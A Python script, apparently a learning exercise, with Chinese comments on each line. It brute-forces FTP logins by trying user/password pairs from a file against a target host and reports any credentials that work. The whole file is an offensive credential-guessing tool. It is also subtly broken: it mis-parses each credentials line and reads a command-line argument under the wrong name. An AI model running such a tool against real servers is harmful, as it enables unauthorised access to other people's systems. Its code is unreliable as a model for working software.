# -*- coding = utf-8 -*-
# @Time:2022/6/7 下午 7:13
# @Author:CK
# @File:ftplib爆破
# @Software:PyCharm
import ftplib,time # 导库
import argparse
def brutrLogin(hostname,passwdFile): # 自定义函数
    pE=open(passwdFile,'r') # 打开文件，并用只读模式
    for line in pE.readlines(): # 循环有多少行
        time.sleep(1) # 睡眠一秒
        useName=line.strip(':')[0] #输入用户名
        passWord=line.strip(':')[1].strip('\r').strip('\n') # 输入密码
        print("[+] Trying:"+useName+'/'+passWord) # 打印
        try: # 尝试运行
            ftp=ftplib.FTP(hostname) # 相当于ftp命令：ftp 172.16.1.103
            ftp.login(useName,passWord) # ftp登录用户密码
            print('\n[*]'+str(hostname)+\
                  'FTP Logon Succeeded:'+useName+'/'+passWord) # 打印结果
            ftp.quit() # 退出ftp
            return (useName,passWord) # 返回值，返回对应内容；如果只有return则中断程序，不再执行，相当于打断点。
        except Exception: # 如果运行失败则
            pass # 跳过
    print('\n[-]Coild not brute force FTP credentials.') # 打印结果
    return (None,None) # 返回值，返回对应内容；如果只有return则中断程序，不再执行，相当于打断点。
if __name__=="__main__":
    parser=argparse.ArgumentParser(description='fishing here')
    parser.add_argument('-H',required=True,help='Hostname',dest='hostname')
    parser.add_argument('-p',required=True,help='PassFile',dest="passFile")
    args=parser.parse_args()
    print(args)
    hostname = args.hostname
    passwdFile = args.passwdFile
    brutrLogin(hostname,passwdFile)